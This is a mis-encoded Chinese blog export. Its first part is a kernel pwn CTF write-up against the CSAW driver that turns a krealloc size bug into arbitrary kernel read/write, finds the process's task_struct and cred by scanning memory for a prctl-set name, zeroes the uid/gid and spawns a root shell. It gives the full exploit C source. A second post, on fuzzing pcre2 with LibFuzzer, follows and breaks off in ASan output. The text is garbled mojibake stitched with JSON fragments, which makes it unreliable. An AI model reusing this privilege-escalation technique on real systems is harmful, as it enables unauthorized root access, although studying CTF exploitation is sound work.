kreallocå‡½æ•°new_sizeæ˜¯ç”±channel-&gt;buf_size-sizeå¾—åˆ°çš„ï¼Œè¿™ä¸¤ä¸ªå€¼éƒ½å¯æ§ï¼Œä»è€Œå¯ä»¥ä½¿å¾—new_size+1==0ã€‚æ ¹æ®kreallocå‡½æ•°æºç ï¼š 12345678910111213141516171819202122232425262728/** * krealloc - reallocate memory. The contents will remain unchanged. * @p: object to reallocate memory for. * @new_size: how many bytes of memory are required. * @flags: the type of memory to allocate. * * The contents of the object pointed to are preserved up to the * lesser of the new and old sizes. If @p is %NULL, krealloc() * behaves exactly like kmalloc(). If @new_size is 0 and @p is not a * %NULL pointer, the object pointed to is freed. * * Return: pointer to the allocated memory or %NULL in case of error */void *krealloc(const void *p, size_t new_size, gfp_t flags){ void *ret; if (unlikely(!new_size)) { kfree(p); return ZERO_SIZE_PTR; } ret = __do_krealloc(p, new_size, flags); if (ret &amp;&amp; kasan_reset_tag(p) != kasan_reset_tag(ret)) kfree(p); return ret;} å¦‚æœä¼ å…¥çš„sizeä¸º0ï¼Œä¼šè¿”å›ZERO_SIZE_PTR(#define ZERO_SIZE_PTR ((void *)16))ï¼Œå³ä¸º0x10(è€Œä¸æ˜¯0!!!)ï¼Œæ­¤æ—¶æœ‰ï¼š 12channel-&gt;buf_size = new_size == 0x10channel-&gt;buf_size = new_size == 0xffffffffffffffff(size_tæ— ç¬¦å·) å¦‚æœå°†channel-&gt;indexèµ‹å€¼ä¸ºtarget_addr-0x10ï¼Œæ ¹æ®read/writeçš„åŠŸèƒ½å¯ä»¥ç»•è¿‡sizeçš„é™åˆ¶ä»è€Œå®ç°ä»»æ„åœ°å€è¯»å†™ğŸ™Œã€‚ åˆ©ç”¨æ–¹æ³•å¯ä»¥ä»»æ„åœ°å€è¯»å†™äº†ï¼Œè¦å¦‚ä½•ææƒå‘¢ï¼Ÿå…±å­¦åˆ°äº†ä¸‰ç§å§¿åŠ¿ 1.ä¿®æ”¹è¿›ç¨‹credç»“æ„ä½“åšè¿‡äº†babydriveré‚£é¢˜å°±æ¯”è¾ƒå®¹æ˜“æƒ³åˆ°çš„è¦ä¿®æ”¹credç»“æ„ä½“äº†ï¼Œä½†è¦æ€ä¹ˆæ‰¾åˆ°credçš„åœ°å€å‘¢ï¼Ÿè™½ç„¶æˆ‘ä»¬å·²ç»å¯ä»¥ä»»æ„åœ°å€è¯»äº†ï¼Œä½†è¦è¯»å“ªé‡Œæ‰èƒ½è¯»åˆ°credå‘¢ï¼Ÿå¤´å¤§ã€‚ã€‚ã€‚çœ‹äº†raycpå¸ˆå‚…çš„åšå®¢å­¦åˆ°äº†å¯»æ‰¾credç»“æ„ä½“çš„æ–¹æ³•tqlï¼ã€‚é¦–å…ˆçº¿ç¨‹ç”±äºè¦ä½¿ç”¨æ‰€å±è¿›ç¨‹çš„èµ„æºï¼Œåœ¨å…¶thread_infoç»“æ„å—ä¸­æœ‰ä¸€ä¸ªstruct task_structç±»å‹çš„ç»“æ„ä½“ï¼Œå…¶å†…å®¹ä¸ºï¼š 1234567891011121314struct task_struct {.../* process credentials */conststruct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */conststruct cred __rcu *real_cred; /* objective and real subjective task* credentials (COW) */conststruct cred __rcu *cred; /* effective (overridable) subjective task* credentials (COW) */char comm[TASK_COMM_LEN]; /* executable name excluding path- access with[gs]et_task_comm (which lock it with task_lock())- initialized normally by setup_new_exec */...}; å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ‰€å…³å¿ƒçš„conststruct cred __rcu *cred; conststruct cred __rcu *real_cred;,è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„åœ°æ–¹åœ¨äºchar comm[TASK_COMM_LEN];ï¼Œè¿™ä¸ªå­—ç¬¦æ•°ç»„ä¿å­˜äº†è¿›ç¨‹çš„åå­—ï¼Œä¹Ÿä¸ºæˆ‘ä»¬å¯»æ‰¾credæä¾›äº†æ–¹æ³•ã€‚é¦–å…ˆï¼Œtask_structæ‰€éœ€çš„å†…å­˜æ˜¯åŠ¨æ€åˆ†é…å¾—åˆ°çš„ï¼Œæˆ‘ä»¬çŸ¥é“é€šè¿‡kmem_cache_alloc_nodeå‡½æ•°ç”³è¯·çš„ç©ºé—´æ˜¯åœ¨å†…æ ¸çš„åŠ¨æ€åˆ†é…åŒºåŸŸã€‚é€šè¿‡ä¸‹é¢çš„å†…æ ¸æ˜ å°„ç©ºé—´å¯ä»¥ç¡®å®šçˆ†ç ´çš„èŒƒå›´åœ¨0xffff880000000000~0xffffc80000000000ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081820xffffffffffffffff ---+-----------+-----------------------------------------------+-------------+ | | |+++++++++++++| 8M | | unused hole |+++++++++++++| | | |+++++++++++++|0xffffffffff7ff000 ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++| 1M | | |+++++++++++++|0xffffffffff600000 ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++| 548K | | vsyscalls |+++++++++++++|0xffffffffff577000 ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++| 5M | | hole |+++++++++++++|0xffffffffff000000 ---+-----------+------------| MODULES_END |--------------------|+++++++++++++| | | |+++++++++++++| 1520M | | module mapping space (MODULES_LEN) |+++++++++++++| | | |+++++++++++++|0xffffffffa0000000 ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++| | | |+++++++++++++| 512M | | kernel text mapping, from phys 0 |+++++++++++++| | | |+++++++++++++|0xffffffff80000000 ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++| 2G | | hole |+++++++++++++|0xffffffff00000000 ---+-----------+-----------------------------------------------|+++++++++++++| 64G | | EFI region mapping space |+++++++++++++|0xffffffef00000000 ---+-----------+-----------------------------------------------|+++++++++++++| 444G | | hole |+++++++++++++|0xffffff8000000000 ---+-----------+-----------------------------------------------|+++++++++++++| 16T | | %esp fixup stacks |+++++++++++++|0xffffff0000000000 ---+-----------+-----------------------------------------------|+++++++++++++| 3T | | hole |+++++++++++++|0xfffffc0000000000 ---+-----------+-----------------------------------------------|+++++++++++++| 16T | | kasan shadow memory (16TB) |+++++++++++++|0xffffec0000000000 ---+-----------+-----------------------------------------------|+++++++++++++| 1T | | hole |+++++++++++++|0xffffeb0000000000 ---+-----------+-----------------------------------------------| kernel space| 1T | | virtual memory map for all of struct pages |+++++++++++++|0xffffea0000000000 ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++| 1T | | hole |+++++++++++++|0xffffe90000000000 ---+-----------+------------| VMALLOC_END |------------------|+++++++++++++| 32T | | vmalloc/ioremap (1 &lt;&lt; VMALLOC_SIZE_TB) |+++++++++++++|0xffffc90000000000 ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++| 1T | | hole |+++++++++++++|0xffffc80000000000 ---+-----------+-----------------------------------------------|+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| 64T | | direct mapping of all phys. memory |+++++++++++++| | | (1 &lt;&lt; MAX_PHYSMEM_BITS) |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++|0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++| | | |+++++++++++++| 8T | | guard hole, reserved for hypervisor |+++++++++++++| | | |+++++++++++++|0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+ |-----------| |-------------| |-----------| hole caused by [48:63] sign extension |-------------| |-----------| |-------------|0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+ PAGE_SIZE | | guard page |xxxxxxxxxxxxx|0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx| | | | user space | | | |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx| 128T | | different per mm |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx|0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+ è¿˜æœ‰è¿™é‡Œä»‹ç»ä¸€ä¸ªå…³é”®çš„å‡½æ•°int prctl( int option,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )ï¼Œè¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿå‡½æ•°ï¼Œæ˜¯ä¸ºè¿›ç¨‹åˆ¶å®šè€Œè®¾è®¡çš„ã€‚å†…æ ¸å¯¹åº”çš„å¤„ç†å‡½æ•°ä¸ºSYSCALL_DEFINE5()ã€‚å…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°optionæŒ‡å®šæ“ä½œç±»å‹ï¼Œå¦‚æŒ‡å®šPR_SET_NAMEï¼Œå³è®¾ç½®è¿›ç¨‹åï¼Œä¹‹åçš„å‚æ•°å³ä¸ºè¡¥å……å‚æ•°ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰§è¡Œprctl(PR_SET_NAME,target)å³å¯å®Œæˆå¯¹è¿›ç¨‹åçš„è®¾å®šã€‚ å› æ­¤åˆ©ç”¨æ–¹æ³•å°±å¾ˆæ˜ç¡®äº†ï¼š1.prctlå‡½æ•°è®¾ç½®è¿›ç¨‹æ˜ã€‚2.åˆ©ç”¨ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel)è§¦å‘æ¼æ´(channel-&gt;date=0x10 channel-&gt;buf_size=0xffffffffffffffff)ã€‚3.åˆ©ç”¨ä»»æ„åœ°å€è¯»åœ¨0xffff880000000000~0xffffc80000000000èŒƒå›´å†…åˆ©ç”¨memmem()å‡½æ•°å¯»æ‰¾è¿›ç¨‹åå­—ç¬¦ä¸²char comm[TASK_COMM_LEN]ã€‚4.æ‰¾åˆ°credåœ°å€ååˆ©ç”¨ä»»æ„åœ°å€å†™ä¿®æ”¹uidgidä¸º0 è§¦å‘æ¼æ´ï¼šcall kreallocæ—¶å¯„å­˜å™¨çŠ¶æ€ï¼š 1234567891011121314151617$rax : 0xffffffffffffffff$rbx : 0xffff88001f9411e0 â†’ 0x0000000100000002 â†’ 0x0000000100000002$rcx : 0x0000000000000000 â†’ 0x0000000000000000$rdx : 0x00000000024000c0 â†’ 0x00000000024000c0$rsp : 0xffff88001f9e3e28 â†’ 0xffff88001f9c5908 â†’ 0x0000000000000000 â†’ 0x0000000000000000$rbp : 0xffff88001f9e3e48 â†’ 0xffff88001f9e3e98 â†’ 0xffff88001f9e3f08 â†’ 0xffff88001f9e3f48 â†’ 0x00007fffde817950 â†’ 0x0000000000401c70 â†’ 0x2b54c73d8d4c5741 â†’ 0x2b54c73d8d4c5741$rsi : 0x0000000000000000 â†’ 0x0000000000000000 //new_size$rdi : 0xffff88001fa10a00 â†’ 0x0000000000000000 â†’ 0x0000000000000000$rip : 0xffffffffc00001a6 â†’ 0xc08548c11a1355e8 â†’ 0xc08548c11a1355e8$r8 : 0x0000000000000101 â†’ 0x0000000000000101$r9 : 0x0000000000000000 â†’ 0x0000000000000000$r10 : 0x0000000000000000 â†’ 0x0000000000000000$r11 : 0x0000000000000000 â†’ 0x0000000000000000$r12 : 0xffffffffffffffff$r13 : 0x0000000000000101 â†’ 0x0000000000000101$r14 : 0x0000000000000000 â†’ 0x0000000000000000$r15 : 0x00007fffde817890 â†’ 0x00007fff00000001 â†’ 0x00007fff00000001 è¿”å›å€¼$rax : 0x0000000000000010 â†’ 0x0000000000000010 èµ‹å€¼æ—¶ï¼š 12345â†’ 0xffffffffc00001b0 &lt;realloc_ipc_channel.isra+80&gt; mov QWORD PTR [rbx+0x8], rax 0xffffffffc00001b4 &lt;realloc_ipc_channel.isra+84&gt; mov QWORD PTR [rbx+0x10], r12$rax : 0x0000000000000010 â†’ 0x0000000000000010$r12 : 0xffffffffffffffff å¯»æ‰¾cred: 123456789101112131415161718192021222324 for(;addr &lt; 0xffffc80000000000;addr += 0x1000){ seek_channel.id = alloc_channel.id; seek_channel.index = addr-0x10; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); read_channel.id = alloc_channel.id; read_channel.buf = buf; read_channel.count = 0x1000; ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel); result = memmem(buf,0x1000,target,16); if (result) { cred = *(size_t *)(result - 0x8); real_cred = *(size_t *)(result - 0x10); if( (cred||0xff00000000000000) &amp;&amp; (real_cred == cred)){ //printf(&quot;[]%lx[]&quot;,result-(int)(buf)); target_addr = addr + result-(int)(buf); printf(&quot;[+]found task_struct 0x%lx\\n&quot;,target_addr); printf(&quot;[+]found cred 0x%lx\\n&quot;,real_cred); break; } }} è°ƒè¯•ï¼š 1234567891011121314gefâ¤ x/40gx 0xffff8800002034c0-0x30 //task_struct0xffff880000203490: 0xffff880019788968 0xffff8800197889780xffff8800002034a0: 0xffff880019788978 0x00000000000000000xffff8800002034b0: 0xffff88001f9c2600 0xffff88001f9c2600 //cred_addr0xffff8800002034c0: 0x3939393939396e61 0x00616c6539393939 //comm0xffff8800002034d0: 0x0000000000000000 0x0000000000000000gefâ¤ x/30gx 0xffff88001f9c2600 //cred0xffff88001f9c2600: 0xffff88001f9c2900 0x000003e8000003e80xffff88001f9c2610: 0x000003e8000003e8 0x000003e8000003e80xffff88001f9c2620: 0x00000000000003e8 0x00000000000000000xffff88001f9c2630: 0x0000000000000000 0x00000000000000000xffff88001f9c2640: 0x0000003fffffffff 0x00000000000000000xffff88001f9c2650: 0x0000000000000000 0x0000000000000000 æ”¹å†™cred: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150for(int i=0;i&lt;44;i++){ seek_channel.id = alloc_channel.id; seek_channel.index = cred-0x10+4+i; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); root_cred[0]=0; write_channel.id = alloc_channel.id; write_channel.count= 1; write_channel.buf = (char*)root_cred; ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel); }å®Œæ•´exp:```c#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE+1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE+2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE+3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE+5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE+6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE+7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE+8struct alloc_channel_args { size_t buf_size; int id;};struct open_channel_args { int id;};struct shrink_channel_args { int id; size_t size;};struct read_channel_args { int id; char *buf; size_t count;};struct write_channel_args { int id; char *buf; size_t count;};struct seek_channel_args { int id; loff_t index; int whence;};struct close_channel_args { int id;};int main(){ struct alloc_channel_args alloc_channel; struct shrink_channel_args shrink_channel; struct seek_channel_args seek_channel; struct read_channel_args read_channel; struct write_channel_args write_channel; struct close_channel_args close_channel; int fd = -1; u_int64_t addr = 0xffff880000000000; u_int64_t real_cred = 0; u_int64_t cred = 0; u_int64_t target_addr; u_int64_t result = 0; int root_cred[12]; setvbuf(stdout,0,2,0); char *buf = malloc(0x1000); char target[16]; strcpy(target,&quot;an9999999999ela&quot;); prctl(PR_SET_NAME,target); fd = open(&quot;/dev/csaw&quot;,O_RDWR); if(fd&lt;0){ perror(&quot;open error&quot;); } alloc_channel.buf_size = 0x100; alloc_channel.id = -1; ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_channel); if(alloc_channel.id == -1){ perror(&quot;alloc error&quot;); } printf(&quot;[+] you have got a channel %d\\n&quot;,alloc_channel.id); shrink_channel.id = alloc_channel.id; shrink_channel.size = 0x101; ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel); //channel-&gt;date=0x10 channel-&gt;buf_size=0xffffffffffffffff printf(&quot;[+] now we can read and write any mem\\n&quot;); for(;addr &lt; 0xffffc80000000000;addr += 0x1000){ seek_channel.id = alloc_channel.id; seek_channel.index = addr-0x10; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); read_channel.id = alloc_channel.id; read_channel.buf = buf; read_channel.count = 0x1000; ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel); result = memmem(buf,0x1000,target,16); if (result) { cred = *(size_t *)(result - 0x8); real_cred = *(size_t *)(result - 0x10); if( (cred||0xff00000000000000) &amp;&amp; (real_cred == cred)){ //printf(&quot;[]%lx[]&quot;,result-(int)(buf)); target_addr = addr + result-(int)(buf); printf(&quot;[+]found task_struct 0x%lx\\n&quot;,target_addr); printf(&quot;[+]found cred 0x%lx\\n&quot;,real_cred); break; } } } if(result == 0){ puts(&quot;not found , try again &quot;); exit(-1); } for(int i=0;i&lt;44;i++){ seek_channel.id = alloc_channel.id; seek_channel.index = cred-0x10+4+i; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); root_cred[0]=0; write_channel.id = alloc_channel.id; write_channel.count= 1; write_channel.buf = (char*)root_cred; ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel); } if(getuid() == 0){ printf(&quot;[+] root now \\n&quot;); system(&quot;/bin/sh&quot;); } return 0;} ç¬¬ä¸€ç§çš„è§£æ³•è¿˜ç®—å¸¸è§„ï¼Œç¬¬äºŒä¸‰ç§è§£æ³•å°±å¾ˆéªšäº†ï¼Œçœ‹ç€p4ndaå’Œraycpä¸¤ä½å¤§å¸ˆå‚…çš„åšå®¢å­¦çš„ï¼Œå¸ˆå‚…ä»¬tql!ğŸ¤©,å¦å¤–ä¸¤ç§ä¼šå•ç‹¬å†å†™ä¸¤ç¯‡postã€‚å‘¨ä¸€è¿˜æœ‰è€ƒè¯•ï¼Œèµ¶ç´§å»å¤ä¹ äº†ğŸ˜­ã€‚","link":"/2020/11/20/kernel_pwn%20%E4%BB%8E%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E7%8B%AC%E5%86%99%E5%88%B0%E6%8F%90%E6%9D%83(1)/"},{"title":"ï¼ˆè½¬ï¼‰LibFuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸‰ï¼‰","text":"æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ï¼Œç”±å®‰å…¨å®¢åŸåˆ›å‘å¸ƒï¼šhttps://www.anquanke.com/post/id/227394 libfuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸‰ï¼‰ workshopä¸€å…±ç»™å‡ºäº†11ä¸ªlessonï¼Œæ¯ä¸€ä¸ªlessonéƒ½ä¼šæ¶‰åŠåˆ°ä¸€äº›æ–°çš„ä¸œè¥¿ï¼Œè¿™ç¯‡ä»¥æœ€åçš„ä¸¤ä¸ªæ¡ˆä¾‹(å¯¹re2å’Œpcre2çš„fuzz)ä¸ºä¾‹ï¼Œä¼šæ¶‰åŠåˆ°ä¸€äº›é“¾æ¥åº“çš„é€‰æ‹©ä»¥åŠæ’æ¡©ç¼–è¯‘æ—¶çš„ä¸€äº›å‚æ•°çš„è®¾ç½®ï¼Œè¿˜æœ‰max_lençš„è®¾ç½®å¯¹æˆ‘ä»¬æœ€åfuzzç»“æœçš„å½±å“ã€‚ fuzzing pcre2pcre2:Perl Compatible Regular Expressions Version 2(Perlå…¼å®¹çš„æ­£åˆ™è¡¨è¾¾å¼)å³æ˜¯ä¸€ä¸ªCè¯­è¨€ç¼–å†™çš„æ­£åˆ™è¡¨è¾¾å¼å‡½æ•°åº“ï¼Œè¢«å¾ˆå¤šå¼€æºè½¯ä»¶æ‰€ä½¿ç”¨æ¯”å¦‚PHPï¼ŒApacheï¼ŒNmapç­‰ã€‚workshopæä¾›çš„pcre2ç‰ˆæœ¬æ˜¯10.00ï¼Œå…ˆè¿›è¡Œæºç ç¼–è¯‘å·¥ä½œã€‚ 123456789tar xzf pcre2-10.00.tgzcd pcre2-10.00./autogen.shexport FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope&quot;CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \\ CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot; ./configure --enable-never-backslash-C \\ --with-match-limit=1000 --with-match-limit-recursion=1000make -j è¿™é‡Œçš„ä¸€äº›æ’æ¡©çš„å‚æ•°å’Œè¿›é˜¶ç¯‡çš„å·®ä¸å¤šï¼Œè¦æ³¨æ„çš„ç¼–è¯‘é€‰é¡¹æ˜¯fuzzer-no-linkï¼Œå¦‚æœä¿®æ”¹å¤§å‹é¡¹ç›®çš„CFLAGSï¼Œå®ƒä¹Ÿéœ€è¦ç¼–è¯‘è‡ªå·±çš„ä¸»ç¬¦å·çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåˆ™å¯èƒ½éœ€è¦åœ¨ä¸é“¾æ¥çš„æƒ…å†µä¸‹ä»…è¯·æ±‚æ£€æµ‹ï¼Œå³fuzzer-no-linkå¼ºåˆ¶åœ¨é“¾æ¥é˜¶æ®µä¸ç”Ÿæ•ˆã€‚å› æ­¤å½“æˆ‘åœ¨æ’æ¡©ç¼–è¯‘ä¸€ä¸ªè¾ƒå¤§çš„å¼€æºåº“çš„æ—¶å€™æ¨èåŠ ä¸Šè¿™ä¸ªé€‰é¡¹ï¼Œå¦‚æœä¸åŠ çš„è¯fuzzæ•ˆç‡å¦‚ä¸‹ï¼š 123456789101112#2 INITED cov: 7 ft: 8 corp: 1/1b exec/s: 0 rss: 27Mb#3 NEW cov: 9 ft: 10 corp: 2/5b lim: 4 exec/s: 0 rss: 27Mb L: 4/4 MS: 1 CrossOver-#7 REDUCE cov: 9 ft: 10 corp: 2/3b lim: 4 exec/s: 0 rss: 28Mb L: 2/2 MS: 4 ChangeByte-CrossOver-ChangeBinInt-EraseBytes-#35 REDUCE cov: 10 ft: 11 corp: 3/5b lim: 4 exec/s: 0 rss: 28Mb L: 2/2 MS: 3 CopyPart-ChangeByte-EraseBytes-#146 REDUCE cov: 10 ft: 11 corp: 3/4b lim: 4 exec/s: 0 rss: 28Mb L: 1/2 MS: 1 EraseBytes-#1491 REDUCE cov: 16 ft: 17 corp: 4/21b lim: 17 exec/s: 0 rss: 28Mb L: 17/17 MS: 5 ChangeBit-ShuffleBytes-InsertRepeatedBytes-ChangeBit-CrossOver-#1889 REDUCE cov: 16 ft: 17 corp: 4/20b lim: 17 exec/s: 0 rss: 28Mb L: 16/16 MS: 3 ShuffleBytes-CopyPart-EraseBytes-#524288 pulse cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 87381 rss: 830Mb#1048576 pulse cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 104857 rss: 830Mb#2097152 pulse cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 123361 rss: 830Mb#4194304 pulse cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 127100 rss: 830Mb#8388608 pulse cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 131072 rss: 830Mb å¦å¤–ï¼Œåœ¨æ‰§è¡Œconfigureç”Ÿæˆmakefileæ—¶é’ˆå¯¹pcre2æ·»åŠ äº†ä¸€äº›å‚æ•°ï¼š--with-match-limit=1000:é™åˆ¶ä¸€æ¬¡åŒ¹é…æ—¶ä½¿ç”¨çš„èµ„æºæ•°ä¸º1000,é»˜è®¤å€¼ä¸º10000000--with-match-limit-recursion=1000:é™åˆ¶ä¸€æ¬¡åŒ¹é…æ—¶çš„é€’å½’æ·±åº¦ä¸º1000,é»˜è®¤ä¸º10000000(å‡ ä¹å¯ä»¥è¯´æ˜¯æ— é™)--enable-never-backslash-C:ç¦ç”¨åœ¨å­—ç¬¦ä¸²ä¸­ï¼Œå°†åæ–œçº¿ä½œä¸ºè½¬ä¹‰åºåˆ—æ¥å—ã€‚ ç¼–è¯‘å¥½å¼€æºåº“åå°±è¦ç ”ç©¶harnessäº†ï¼Œworkshopæä¾›çš„å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425// Copyright 2016 Google Inc. All Rights Reserved.// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &lt;string&gt;#include &quot;pcre2posix.h&quot;using std::string;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const unsigned char *data, size_t size) { if (size &lt; 1) return 0; regex_t preg; string str(reinterpret_cast&lt;const char*&gt;(data), size); string pat(str); int flags = data[size/2] - 'a'; // Make it 0 when the byte is 'a'. if (0 == regcomp(&amp;preg, pat.c_str(), flags)) { regmatch_t pmatch[5]; regexec(&amp;preg, str.c_str(), 5, pmatch, 0); regfree(&amp;preg); } return 0;} è§£é‡Šä¸€ä¸‹é€»è¾‘ï¼šé¦–å…ˆå°†æ ·æœ¬è¾“å…¥ä¸­çš„â€™aâ€™ç½®0ï¼Œä¹‹åé€šè¿‡regcomp()å‡½æ•°ç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼ï¼Œå³å°†æŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼pat.c_str()ç¼–è¯‘ä¸ºç‰¹å®šæ•°æ®æ ¼å¼pregï¼Œä½¿å¾—åŒ¹é…æ›´åŠ æœ‰æ•ˆã€‚å‡½æ•°regexec()ä¼šä½¿ç”¨è¿™ä¸ªæ•°æ®åœ¨ç›®æ ‡æ–‡æœ¬ä¸²ä¸­è¿›è¡Œæ¨¡å¼åŒ¹é…ï¼Œä¹‹åregfree()é‡Šæ”¾æ­£åˆ™è¡¨è¾¾å¼ã€‚è¿™ä¸ªharnessé€šè¿‡includeåº“â€pcre2posix.hâ€ï¼Œå°†pcre2ä¸»è¦çš„å‡½æ•°åŒ…å«åœ¨äº†é‡Œé¢ï¼ŒåŒæ—¶è¿™äº›å‡½æ•°æ¶‰åŠåˆ°çš„ä¸€äº›å†…å­˜ç›¸å…³çš„æ“ä½œä¹Ÿå¸¸å¸¸æ˜¯è§¦å‘crashçš„ç‚¹ã€‚ä¹‹åè¿›è¡Œç¼–è¯‘é“¾æ¥ï¼š 1clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope pcre2_fuzzer.cc -I pcre2-10.00/src -Wl,--whole-archive pcre2-10.00/.libs/libpcre2-8.a pcre2-10.00/.libs/libpcre2-posix.a -Wl,-no-whole-archive -fsanitize=fuzzer -o pcre2-10.00-fsanitize_fuzzer å’Œä¹‹å‰ä¸åŒï¼Œè¿™æ¬¡å¤šäº†ä¸€äº›å‚æ•°ï¼š--whole-archiveå’Œ--no-whole-archiveæ˜¯ldä¸“æœ‰çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œclang++å¹¶ä¸è®¤è¯†ï¼Œè¦é€šè¿‡clang++ä¼ é€’åˆ°ldï¼Œéœ€è¦åœ¨ä»–ä»¬å‰é¢åŠ -Wlã€‚--whole-archiveå¯ä»¥æŠŠ åœ¨å…¶åé¢å‡ºç°çš„é™æ€åº“åŒ…å«çš„å‡½æ•°å’Œå˜é‡è¾“å‡ºåˆ°åŠ¨æ€åº“ï¼Œ--no-whole-archiveåˆ™å…³æ‰è¿™ä¸ªç‰¹æ€§ï¼Œå› æ­¤è¿™é‡Œå°†ä¸¤ä¸ªé™æ€åº“libpcre2-8.aå’Œlibpcre2-posix.aé‡Œçš„ç¬¦å·è¾“å‡ºåˆ°åŠ¨æ€åº“é‡Œï¼Œä½¿å¾—ç¨‹åºå¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€é“¾æ¥ä½¿ç”¨åˆ°çš„å‡½æ•°ï¼Œä¹Ÿä½¿å¾—fuzzæ•ˆç‡å¾—åˆ°äº†æå‡ã€‚æ‰§è¡Œä¸€ä¸‹å¾ˆå¿«å¾—åˆ°äº†crash: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#538040 NEW cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1775 rss: 775Mb L: 24/74 MS: 3 ChangeASCIIInt-ChangeASCIIInt-EraseBytes-#538092 REDUCE cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1775 rss: 775Mb L: 23/74 MS: 2 CopyPart-EraseBytes-#538098 REDUCE cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1758 rss: 775Mb L: 6/74 MS: 1 EraseBytes-#538204 REDUCE cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1758 rss: 775Mb L: 16/74 MS: 1 EraseBytes-#538415 REDUCE cov: 3286 ft: 15825 corp: 6804/134Kb lim: 74 exec/s: 1759 rss: 775Mb L: 35/74 MS: 1 ShuffleBytes-===================================================================17319==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe809de45f at pc 0x0000005e1518 bp 0x7ffe809dd8f0 